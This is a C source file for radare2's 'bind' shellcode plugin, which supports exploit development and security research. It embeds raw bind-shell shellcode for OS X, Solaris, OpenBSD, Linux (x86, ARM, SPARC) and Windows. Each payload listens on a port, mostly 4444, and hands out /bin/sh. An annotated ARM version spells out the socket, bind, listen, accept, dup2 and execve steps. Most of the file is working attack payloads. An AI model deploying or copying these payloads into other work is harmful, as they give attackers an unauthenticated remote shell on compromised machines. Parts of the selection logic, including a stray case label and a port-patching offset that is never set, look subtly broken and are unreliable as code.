/* radare - LGPL - Copyright 2013-2025 - pancake */

#include <r_egg.h>

#define SUPPORT_UDP 0

static ut8 x86_osx_bind4444[] =
	"\x33\xc9\x83\xe9\xea\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xc5"
	"\x7e\x85\xb4\x83\xeb\xfc\xe2\xf4\xaf\x3c\xdd\x79\x45\x14\xe4\xec"
	"\x5c\x2c\xed\xa4\xc7\x6f\xd9\x3d\x24\x2c\xc7\xe6\x87\x2c\xef\xa4"
	"\x08\xfe\x1c\x27\x94\x2d\xd7\xde\xad\x26\x48\x34\x75\x14\x48\x34"
	"\x97\x2d\xd7\x04\xdb\xb3\x05\x23\xaf\x7c\xdc\xde\x9f\x26\xd4\xe3"
	"\x94\xb3\x05\xfd\xca\xf7\x74\x4b\x3a\x81\xd5\xdc\xea\x51\xf6\xdc"
	"\xad\x51\xe7\xdd\xab\xf7\x66\xe4\x91\x2a\xd6\xe7\x75\x45\x48\x34";

static ut8 x86_solaris_bind4444[] =
	"\x31\xc9\x83\xe9\xe8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x3f"
	"\x08\x0b\x8d\x83\xeb\xfc\xe2\xf4\x87\xf7\xf3\x72\x03\xff\xdb\xdd"
	"\x0e\xc8\xbb\x17\x6f\x81\xee\xbc\xf6\x59\x4a\xcc\x6e\x59\xbb\x6b"
	"\xc0\xdd\x3a\x5f\xb6\xcf\x59\xeb\x57\x19\x57\xeb\x6e\x81\xed\xe7"
	"\x2f\x5e\x5c\x3d\xd7\xf7\xde\x3d\xd6\xf7\xde\xdd\x6f\x5f\xbb\x67"
	"\xc0\xdd\x3a\x5f\x8d\x01\x5a\xdf\x6f\xb8\x35\x72\xea\x41\x72\x7f"
	"\x6f\x60\x24\xa2\x4c\x60\x63\xa2\x5d\x61\x65\x04\xdc\x58\x58\x04"
	"\xdd\x58\x59\xde\x8f\x33\xf4\x58";

// TODO: port must be configurable
static long x86_openbsd_bind6969[]= { // 391b
	0x4151c931,0x51514151,0x61b0c031,0x078980cd,0x4f88c931,0x0547c604,0x084f8902,
	0x0647c766,0x106a391b,0x5004478d,0x5050078b,0x68b0c031,0x016a80cd,0x5050078b,
	0x6ab0c031,0xc93180cd,0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,0x50078b51,
	0xb0c03150,0x4180cd5a,0x7503f983,0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
	0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,0x01b0c031,0xd8e880cd,0x2fffffff,
	0x2f6e6962,0x90416873 };

static ut8 x86_linux_bind4444[] =
	"\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x81\x9c\x95"
	"\xe9\x83\xeb\xfc\xe2\xf4\xb0\x47\xc6\xaa\xd2\xf6\x97\x83\xe7\xc4\x0c\x60"
	"\x60\x51\x15\x7f\xc2\xce\xf3\x81\x90\xc0\xf3\xba\x08\x7d\xff\x8f\xd9\xcc"
	"\xc4\xbf\x08\x7d\x58\x69\x31\xfa\x44\x0a\x4c\x1c\xc7\xbb\xd7\xdf\x1c\x08"
	"\x31\xfa\x58\x69\x12\xf6\x97\xb0\x31\xa3\x58\x69\xc8\xe5\x6c\x59\x8a\xce"
	"\xfd\xc6\xae\xef\xfd\x81\xae\xfe\xfc\x87\x08\x7f\xc7\xba\x08\x7d\x58\x69\x00";

#if SUPPORT_UDP
static ut8 x86_linux_udp4444[] =
	"\x33\xc9\x83\xe9\xe7\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x13\xec\x81"
	"\xca\x83\xeb\xfc\xe2\xf4\x22\x37\xd2\xa0\x11\x86\x83\x89\x79\x8a\xd9\x43"
	"\xf2\x21\x01\x59\x4a\x5c\xbe\x07\x93\xa5\xf8\x33\x48\xb6\xe9\xb5\x13\xec"
	"\x80\xac\x7b\xfd\xdd\xac\x40\x65\x60\xa0\x03\xbd\xd2\x43\xf2\xaf\x31\xac"
	"\xde\x6c\xeb\xc1\x4b\xbe\xe7\xa2\x3e\x85\x08\x2b\x79\x8b\xe7\xa2\x7a\x82"
	"\xe9\xaf\x77\x85\xf5\xa2\x3e\xc1\xef\xa5\x9a\x0b\xd3\xa2\x3c\xc3\xf2\xa2"
	"\x7b\xc3\xe3\xa3\x7d\x65\x62\x98\x42\xbb\xd2\x43\xf2\x21\x01\xca\x00";
#endif


static ut8 arm_linux_bind[] =
	"\x20\x60\x8f\xe2"   /*  add   r6, pc, #32           */
	"\x07\x70\x47\xe0"   /*  sub   r7, r7, r7            */
	"\x01\x70\xc6\xe5"   /*  strb  r7, [r6, #1]          */
	"\x01\x30\x87\xe2"   /*  add   r3, r7, #1            */
	"\x13\x07\xa0\xe1"   /*  mov   r0, r3, lsl r7        */
	"\x01\x20\x83\xe2"   /*  add   r2, r3, #1            */
	"\x07\x40\xa0\xe1"   /*  mov   r4, r7                */
	"\x0e\xe0\x4e\xe0"   /*  sub   lr, lr, lr            */
	"\x1c\x40\x2d\xe9"   /*  stmfd sp!, {r2-r4, lr}      */
	"\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
	"\x66\xff\x90\xef"   /*  swi   0x90ff66     (socket) */
	"\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
	"\x35\x70\xc6\xe5"   /*  strb  r7, [r6, #53]         */
	"\x14\x20\xa0\xe3"   /*  mov   r2, #20               */
	"\x82\x28\xa9\xe1"   /*  mov   r2, r2, lsl #17       */
	"\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
	"\x14\x40\x2d\xe9"   /*  stmfd sp!, {r2,r4, lr}      */
	"\x10\x30\xa0\xe3"   /*  mov   r3, #16               */
	"\x0d\x20\xa0\xe1"   /*  mov   r2, sp                */
	"\x0d\x40\x2d\xe9"   /*  stmfd sp!, {r0, r2, r3, lr} */
	"\x02\x20\xa0\xe3"   /*  mov   r2, #2                */
	"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
	"\x0d\x10\xa0\xe1"   /*  mov   r1, sp                */
	"\x66\xff\x90\xef"   /*  swi   0x90ff66       (bind) */
	"\x45\x70\xc6\xe5"   /*  strb  r7, [r6, #69]         */
	"\x02\x20\x82\xe2"   /*  add   r2, r2, #2            */
	"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
	"\x66\xff\x90\xef"   /*  swi   0x90ff66     (listen) */
	"\x5d\x70\xc6\xe5"   /*  strb  r7, [r6, #93]         */
	"\x01\x20\x82\xe2"   /*  add   r2, r2, #1            */
	"\x12\x07\xa0\xe1"   /*  mov   r0, r2, lsl r7        */
	"\x04\x70\x8d\xe5"   /*  str   r7, [sp, #4]          */
	"\x08\x70\x8d\xe5"   /*  str     r7, [sp, #8]          */
	"\x66\xff\x90\xef"   /*  swi   0x90ff66     (accept) */
	"\x10\x57\xa0\xe1"   /*  mov   r5, r0, lsl r7        */
	"\x02\x10\xa0\xe3"   /*  mov   r1, #2                */
	"\x71\x70\xc6\xe5"   /*  strb  r7, [r6, #113]        */
	"\x15\x07\xa0\xe1"   /*  mov   r0, r5, lsl r7 <dup2> */
	"\x3f\xff\x90\xef"   /*  swi   0x90ff3f       (dup2) */
	"\x01\x10\x51\xe2"   /*  subs  r1, r1, #1            */
	"\xfb\xff\xff\x5a"   /*  bpl   <dup2>                */
	"\x99\x70\xc6\xe5"   /*  strb  r7, [r6, #153]        */
	"\x14\x30\x8f\xe2"   /*  add   r3, pc, #20           */
	"\x04\x30\x8d\xe5"   /*  str     r3, [sp, #4]          */
	"\x04\x10\x8d\xe2"   /*  add   r1, sp, #4            */
	"\x02\x20\x42\xe0"   /*  sub   r2, r2, r2            */
	"\x13\x02\xa0\xe1"   /*  mov   r0, r3, lsl r2        */
	"\x08\x20\x8d\xe5"   /*  str   r2, [sp, #8]          */
	"\x0b\xff\x90\xef"   /*  swi     0x900ff0b    (execve) */
	"/bin/sh";

static ut8 sparc_linux_bind4444[] =
	"\x23\x2d\x57\xbb\xa2\x14\x63\xd5\x20\xbf\xff\xff\x20\xbf\xff\xff"
	"\x7f\xff\xff\xff\xea\x03\xe0\x20\xaa\x9d\x40\x11\xea\x23\xe0\x20"
	"\xa2\x04\x40\x15\x81\xdb\xe0\x20\x12\xbf\xff\xfb\x9e\x03\xe0\x04"
	"\x29\x75\x4f\xd2\xf1\x9a\xaf\xde\x61\x8a\x8f\xdf\x61\x89\x70\x2b"
	"\xb1\xed\x30\x2b\xf1\xd1\xf0\x37\x60\x35\xaf\xcb\x06\x29\x8f\x1d"
	"\x97\x99\xf0\xb1\x3c\x3a\x50\x91\x9a\x2d\xb0\xc1\x32\x6e\x0f\x15"
	"\x54\x4a\xcf\x2d\xb1\xad\x30\x49\x69\xb8\x10\x0d\xc3\xdf\x12\xb8"
	"\xfb\xe4\x2d\x22\x6c\x0b\x72\xa0\x1d\xfb\x52\xb4\xbf\xeb\xb2\xb5"
	"\x22\x28\x0d\x4d\x32\x3f\x52\xa9\xa3\xef\xb2\xa1\x04\x2c\x0d\x39"
	"\x44\x10\xcd\x45\xd4\x47\x12\xb0\x45\xb7\x72\xaa\xb6\x14\xcd\x3e"
	"\xa4\x4b\x12\xbd\x5a\xc9\x32\xc0\xd9\x1d\x92\x98\x4c\xcd\xf3\x0c"
	"\x7c\x52\x0c\xd1\x51\xae\x4c\xdd\xc5\xab\x73\x16\xc4\xc7\xab\xb2"
	"\xa6\xcc\x6a\xac\x85\xe7\xb1\xea\x59\xdb\xea\x1a\xc8\x38\x4a\x12"
	"\x0c\x04\x35\xd2\x1c\x58\xf5\xea\x5c\xbc\xb5\xf6\xde\xd2\xea\x3d"
	"\x4f\x02\xca\x49\x70\xa3\x0a\x49";

static ut8 x86_w32_tcp4444[] =
	"\x33\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x7a"
	"\xba\xcb\x13\x83\xeb\xfc\xe2\xf4\x86\xd0\x20\x5e\x92\x43\x34\xec"
	"\x85\xda\x40\x7f\x5e\x9e\x40\x56\x46\x31\xb7\x16\x02\xbb\x24\x98"
	"\x35\xa2\x40\x4c\x5a\xbb\x20\x5a\xf1\x8e\x40\x12\x94\x8b\x0b\x8a"
	"\xd6\x3e\x0b\x67\x7d\x7b\x01\x1e\x7b\x78\x20\xe7\x41\xee\xef\x3b"
	"\x0f\x5f\x40\x4c\x5e\xbb\x20\x75\xf1\xb6\x80\x98\x25\xa6\xca\xf8"
	"\x79\x96\x40\x9a\x16\x9e\xd7\x72\xb9\x8b\x10\x77\xf1\xf9\xfb\x98"
	"\x3a\xb6\x40\x63\x66\x17\x40\x53\x72\xe4\xa3\x9d\x34\xb4\x27\x43"
	"\x85\x6c\xad\x40\x1c\xd2\xf8\x21\x12\xcd\xb8\x21\x25\xee\x34\xc3"
	"\x12\x71\x26\xef\x41\xea\x34\xc5\x25\x33\x2e\x75\xfb\x57\xc3\x11"
	"\x2f\xd0\xc9\xec\xaa\xd2\x12\x1a\x8f\x17\x9c\xec\xac\xe9\x98\x40"
	"\x29\xf9\x98\x50\x29\x45\x1b\x7b\x7a\xba\xcb\x13\x1c\xd2\xda\x4f"
	"\x1c\xe9\x42\xf2\xef\xd2\x27\xea\xd0\xda\x9c\xec\xac\xd0\xdb\x42"
	"\x2f\x45\x1b\x75\x10\xde\xad\x7b\x19\xd7\xa1\x43\x23\x93\x07\x9a"
	"\x9d\xd0\x8f\x9a\x98\x8b\x0b\xe0\xd0\x2f\x42\xee\x84\xf8\xe6\xed"
	"\x38\x96\x46\x69\x42\x11\x60\xb8\x12\xc8\x35\xa0\x6c\x45\xbe\x3b"
	"\x85\x6c\x90\x44\x28\xeb\x9a\x42\x10\xbb\x9a\x42\x2f\xeb\x34\xc3"
	"\x12\x17\x12\x16\xb4\xe9\x34\xc5\x10\x45\x34\x24\x85\x6a\xa3\xf4"
	"\x03\x7c\xb2\xec\x0f\xbe\x34\xc5\x85\xcd\x37\xec\xaa\xd2\x3b\x99"
	"\x7e\xe5\x98\xec\xac\x45\x1b\x13";


static RBuffer *build(REgg *egg) {
	char *shell= NULL;
	RBuffer *buf = r_buf_new ();
	const ut8 *sc = NULL;
	int cd = 0;
	char *port = r_egg_option_get (egg, "port");
	//TODO: char *udp = r_egg_option_get (egg, "udp");
	switch (egg->os) {
	case R_EGG_OS_OSX:
	case R_EGG_OS_DARWIN:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			sc = x86_osx_bind4444;
			break;
		}
		break;
	case R_EGG_OS_SOLARIS:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			sc = x86_solaris_bind4444;
			break;
		}
		break;
	case R_EGG_OS_OPENBSD:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			sc = (const ut8*)x86_openbsd_bind6969;
			break;
		}
		break;
	case R_EGG_OS_LINUX:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			switch (egg->bits) {
			case 32: sc = x86_linux_bind4444; break;
			// TODO: support udpcase 32: sc = x86_linux_udp4444; break;
			}
			break;
		case R_SYS_ARCH_SPARC:
			sc = sparc_linux_bind4444;
			break;
		case R_SYS_ARCH_ARM:
			case 32: sc = arm_linux_bind; break;
			break;
		}
		break;
	case R_EGG_OS_WINDOWS:
		sc = x86_w32_tcp4444;
		break;
	default:
		R_LOG_ERROR ("unsupported os %x", egg->os);
		break;
	}
	if (sc) {
		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
		if (R_STR_ISNOTEMPTY (port)) {
			if (cd) {
				ut8 nport = atoi (port);
				r_buf_write_at (buf, cd, (const ut8*)&nport, 1);
			} else {
				R_LOG_ERROR ("Cannot set port");
			}
		}
	} else {
		R_LOG_ERROR ("Unsupported target");
	}
	free (shell);
	return buf;
}

//TODO: rename plugin to run
REggPlugin r_egg_plugin_bind = {
	.meta = {
		.name = "bind",
		.author = "pancake",
		.license = "MIT",
		.desc = "listen port=4444",
	},
	.type = R_EGG_PLUGIN_SHELLCODE,
	.build = (void *)build
};

#ifndef R2_PLUGIN_INCORE
R_API RLibStruct radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_bind,
	.version = R2_VERSION
};
#endif
